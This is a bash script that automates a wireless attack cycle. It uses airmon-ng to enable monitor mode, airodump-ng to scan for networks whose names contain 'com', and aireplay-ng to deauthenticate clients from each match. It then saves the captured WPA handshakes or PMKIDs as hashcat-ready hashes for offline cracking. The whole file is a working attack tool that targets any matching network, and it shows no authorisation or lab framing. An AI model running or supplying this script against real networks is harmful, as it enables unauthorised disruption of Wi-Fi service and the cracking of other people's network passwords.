#!/bin/bash
NC='\033[0m'       # Text Reset

# Regular Colors
GREEN='\033[0;32m'        # Green
YELLOW='\033[0;33m'       # Yellow
WHITE='\033[0;37m'        # White
RED='\033[0;31m'          # Red

# Enable recursive globbing for cleaning
shopt -s globstar

# Configuration
# INTERFACE_PRE="wlx289401b9b39f"
INTERFACE_PRE="wlx2a9401b9b39f"
INTERFACE="wlan0mon"
TARGET_STRING="com"
OUTPUT_DIR="./captures"
SCAN_TIME="15s"
MON_TIME="15s"
mkdir -p "$OUTPUT_DIR/scans"

echo -e "${GREEN}Starting target cycle for: $TARGET_STRING${NC}"

# 1. Prepare Interface
sudo airmon-ng check kill
sudo airmon-ng start $INTERFACE_PRE
# Main loop
while true; do
    # 2. Initial Scan to find channels
    echo -e "${GREEN}Scanning for '$TARGET_STRING' targets ($SCAN_TIME)...${NC}"
    # 1. Perform a quick 15s scan to find current channels for "wombat" targets
    sudo timeout $SCAN_TIME airodump-ng  -w "$OUTPUT_DIR/scans/scan"  "$INTERFACE"  > /dev/null 2>&1
    
    # 2. Parse the latest CSV for BSSID and Channel
    LATEST_CSV=$(ls -t "$OUTPUT_DIR/scans/"*[0-9].csv | head -n 1)
    echo "Using targets from $LATEST_CSV"
    mapfile -t TARGET_LIST < <(grep "$TARGET_STRING" $LATEST_CSV)
    echo "${#TARGET_LIST[@]} targets found.  Target list:"
    echo -e $YELLOW
    for target in "${TARGET_LIST[@]}"; do
        echo $target | awk -F, '{printf "    %s\n" , $(NF-1)} target' 
    done
    echo -e $NC
    echo -e "${GREEN}Scan complete.  Attacking targets...${NC}"
    echo -e $YELLOW
    for target in "${TARGET_LIST[@]}"; do

        ESSID=$(echo $target | awk -F, '{print $(NF-1)} target' | tr -d ' ')
        BSSID=$(echo $target | cut -d',' -f1 | tr -d ' ')
        CH=$(echo $target | cut -d',' -f4 | tr -d ' ')
        SESSION_CAP="$OUTPUT_DIR/$ESSID"

        echo "Current Target: $ESSID with BSSID $BSSID on channel $CH"
        
        # Start airodump-ng for 60 seconds
        sudo timeout $MON_TIME airodump-ng --bssid "$BSSID"  -w "$SESSION_CAP" "$INTERFACE" > /dev/null 2>&1 < /dev/null &
        MONITOR_PID=$!
        sleep 5s # Let it settle
        sudo aireplay-ng -D -0 3 -a "$BSSID" "$INTERFACE"  > /dev/null 2>&1
        wait $MONITOR_PID

        # 3. THE VALIDATION CHECK
        # Use hcxpcapngtool to see if a crackable hash was actually caught
        # If it writes a file, we have a winner.
        LATEST_CAP=$(ls -t "$SESSION_CAP"*.cap | head -n 1)
        TEST_HASH="$OUTPUT_DIR/check_${ESSID}.hc22000"
        hcxpcapngtool -o "$TEST_HASH" "$LATEST_CAP" #> /dev/null 2>&1

        if [ -s "$TEST_HASH" ]; then
            echo " SUCCESS: Valid handshake/PMKID captured for $BSSID!"
            echo "Hash saved to: $TEST_HASH"
            # Optional: Move the successful .cap to a "finished" folder
            exit 0 # Stop everything
        else
            echo "No valid handshake yet for $BSSID. Moving to next target..."
        fi
    done
    echo -e $GREEN 
    echo "Finished one full sweep. Restarting scan..."
    echo -e $NC
    sleep 2
done

